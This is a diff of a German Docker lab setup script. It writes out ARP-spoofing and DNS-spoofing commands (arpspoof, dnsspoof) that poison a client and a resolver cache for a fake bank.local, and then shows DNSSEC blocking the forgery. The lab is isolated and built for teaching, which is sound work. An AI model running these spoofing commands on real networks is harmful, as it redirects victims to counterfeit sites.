@@ -10,28 +10,20 @@ NET=lab05-net
 SUBNET=10.50.0.0/24
 GW=10.50.0.1
 
-echo "==> (1/5) Externes Netzwerk $NET ($SUBNET)"
+echo "==> (1/4) Externes Netzwerk $NET ($SUBNET)"
 docker network inspect "$NET" >/dev/null 2>&1 || \
   docker network create --subnet "$SUBNET" --gateway "$GW" "$NET"
 
-echo "==> (2/5) Starte Container"
+echo "==> (2/4) Starte Container (erster Lauf baut das Opfer-Image – kann etwas dauern)"
 docker compose up -d
 
-echo "==> (3/5) Rueste Angreifer aus (dsniff: arpspoof + dnsspoof) – kann ~1 Min dauern"
+echo "==> (3/4) Rueste Angreifer aus (dsniff: arpspoof + dnsspoof) – kann ~1 Min dauern"
 docker exec lab05-attacker bash -c \
   "apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
    dsniff iproute2 tcpdump dnsutils net-tools >/dev/null 2>&1" || \
   echo "   ! Hinweis: Tool-Installation pruefen (Internetzugang im Container?)"
 
-echo "==> (3b/5) Rueste Opfer aus (curl + dig)"
-for V in lab05-victim lab05-victim2; do
-  docker exec "$V" bash -c \
-    "apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
-     curl dnsutils >/dev/null 2>&1" || \
-    echo "   ! Hinweis: curl/dig in $V pruefen (Internetzugang im Container?)"
-done
-
-echo "==> (4/5) Warte auf DNSSEC-Signatur der Zone bank.local (auth-dns)"
+echo "==> (4/4) Warte auf DNSSEC-Signatur der Zone bank.local (auth-dns)"
 for _ in $(seq 1 40); do
   docker exec lab05-auth-dns sh -c 'test -s /shared/bank.local.ksk' 2>/dev/null && break
   sleep 1
@@ -45,7 +37,7 @@ AUTH=$(ip_of lab05-auth-dns)
 FAKE=$(ip_of lab05-web-fake)
 REAL=$(ip_of lab05-web-real)
 
-echo "==> (5/5) Schreibe .attack-cmds"
+echo "==> (4b/4) Schreibe .attack-cmds"
 cat > .attack-cmds <<EOF
 # =============================================================================
 #  Lab 05  –  Angriffsbefehle (automatisch mit echten IPs gefuellt)
@@ -56,24 +48,30 @@ cat > .attack-cmds <<EOF
 # -----------------------------------------------------------------------------
 
 ## SZENARIO A  –  Angriff direkt am Client (nur victim betroffen)
+# ip_forward AUS: Angreifer antwortet direkt, echte Antwort erreicht Resolver nicht
+./switch-attacker.sh a
 # Drei Terminals auf dem Host:
 docker exec -it lab05-attacker arpspoof -i eth0 -t $VICTIM $RESOLVER
 docker exec -it lab05-attacker arpspoof -i eth0 -t $RESOLVER $VICTIM
 docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
 # Test:
-docker exec lab05-victim getent hosts bank.local      # -> $FAKE  (statt $REAL)
+docker exec lab05-victim getent ahostsv4 bank.local      # -> $FAKE  (statt $REAL)
 
 ## SZENARIO B  –  Angriff am Resolver (Cache, ALLE Clients betroffen)
+# ip_forward AN: Resolver muss weiter funktionieren; nur DNS-Antwort von auth-dns wird gefaelscht
+./switch-attacker.sh b
 docker exec lab05-resolver unbound-control flush_zone bank.local.
 docker exec -it lab05-attacker arpspoof -i eth0 -t $RESOLVER $AUTH
 docker exec -it lab05-attacker arpspoof -i eth0 -t $AUTH $RESOLVER
 docker exec -it lab05-attacker dnsspoof -i eth0 -f /attacker/dnsspoof-hosts
-docker exec lab05-victim  getent hosts bank.local     # fuellt den Cache
+docker exec lab05-victim  getent ahostsv4 bank.local     # fuellt den Cache
 docker exec lab05-resolver unbound-control dump_cache | grep bank.local
 # Jetzt Angriff stoppen (Strg+C) und Opfer 2 testen -> trotzdem vergiftet:
-docker exec lab05-victim2 getent hosts bank.local     # -> $FAKE
+docker exec lab05-victim2 getent ahostsv4 bank.local     # -> $FAKE
 
 ## SZENARIO C  –  Gegenmassnahme DNSSEC
+# ip_forward bleibt AN (gleiche Bedingungen wie B)
+./switch-attacker.sh b
 docker exec lab05-resolver /scripts/enable-dnssec.sh
 # Szenario B erneut -> Resolver verwirft die Faelschung:
 docker exec lab05-victim dig @$RESOLVER bank.local +dnssec   # -> SERVFAIL
